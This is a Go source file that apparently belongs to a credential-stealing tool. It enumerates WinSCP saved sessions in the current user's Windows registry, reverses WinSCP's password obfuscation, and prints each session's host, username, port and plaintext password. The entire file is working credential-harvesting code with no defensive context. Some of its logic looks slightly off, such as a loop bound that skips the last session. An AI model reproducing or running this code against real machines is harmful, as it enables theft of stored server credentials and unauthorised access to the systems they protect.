package ftp

import (
	"fmt"
	"strconv"
	"strings"

	"golang.org/x/sys/windows/registry"
)

func readSubKey(registryKey string) ([]string, error) {
	var access uint32 = registry.QUERY_VALUE | registry.ENUMERATE_SUB_KEYS
	var keyNames []string
	regKey, err := registry.OpenKey(registry.CURRENT_USER, registryKey, access)
	if err != nil {
		return keyNames, err
	}

	defer func() {
		if err := regKey.Close(); err != nil {
			fmt.Printf("Failed to close reg key '%v' Error: %v", regKey, err)
		}
	}()
	keyNames, err = regKey.ReadSubKeyNames(0)
	if err != nil {
		fmt.Printf("Failed to get %q keys from registry error: %v", regKey, err)
		return keyNames, nil
	}
	// fmt.Println("Keynames: ", keyNames)
	return keyNames, nil
}
func queryValue(regKey string, value string) any {
	k, err := registry.OpenKey(registry.CURRENT_USER, regKey, registry.QUERY_VALUE)
	logErr(err)
	defer k.Close()

	sStr, _, errS := k.GetStringValue(value)
	if errS == registry.ErrUnexpectedType {
		sInt, _, errI := k.GetIntegerValue(value)
		if errI == registry.ErrUnexpectedType {
			return "unexpected key value type"
		}
		logErr(errI)
		return sInt
	}
	logErr(errS)
	return sStr
}

func decodeNextChar(p []string) int {
	tmp0, err0 := strconv.Atoi(p[0])
	logErr(err0)
	tmp1, err1 := strconv.Atoi(p[1])
	logErr(err1)
	return 0xFF ^ ((((tmp0 << 4) + tmp1) ^ 0xA3) & 0xFF)
}
func decryptPass(user, pass, host any) string {
	u := user.(string)
	p := pass.(string)
	h := host.(string)
	if u == "" || p == "" || h == "" {
		return p
	}
	var (
		passwd      []string
		num, idx, k int
		text        string
	)
	for _, char := range p {
		c := fmt.Sprintf("%c", char)
		switch c {
		case "A":
			c = "10"
		case "B":
			c = "11"
		case "C":
			c = "12"
		case "D":
			c = "13"
		case "E":
			c = "14"
		case "F":
			c = "15"
		}
		passwd = append(passwd, c)
	}
	num = 0
	if decodeNextChar(passwd) == 255 {
		num = 255
	}
	num = decodeNextChar(passwd[4:])
	num2 := decodeNextChar(passwd[6:]) * 2
	idx = num2 + 6
	for k = -1; k < num; k++ {
		str := fmt.Sprintf("%c", decodeNextChar(passwd[idx:]))
		idx += 2
		text += str
	}
	text = strings.ReplaceAll(text, u, "")
	text = strings.ReplaceAll(text, h, "")
	text = strings.TrimPrefix(text, "ï")
	return text
}
func WinSCPCreds() {
	registryKey := `Software\Martin Prikryl\WinSCP 2\Sessions`
	subKeys, err := readSubKey(registryKey)
	logErr(err)
	var i int
	for i = 0; i < len(subKeys)-1; i++ {
		session := registryKey + `\` + subKeys[i]
		fmt.Printf("Session Name: %s\n", subKeys[i])
		user := queryValue(session, "UserName")
		pass := queryValue(session, "Password")
		port := queryValue(session, "PortNumber")
		host := queryValue(session, "HostName")
		passwd := decryptPass(user, pass, host)
		logErr(err)
		fmt.Printf("HostName: %v\n", host)
		fmt.Printf("UserName: %v\n", user)
		fmt.Printf("Password: %v\n", passwd)
		fmt.Printf("PortNumber: %v\n", port)
	}
}
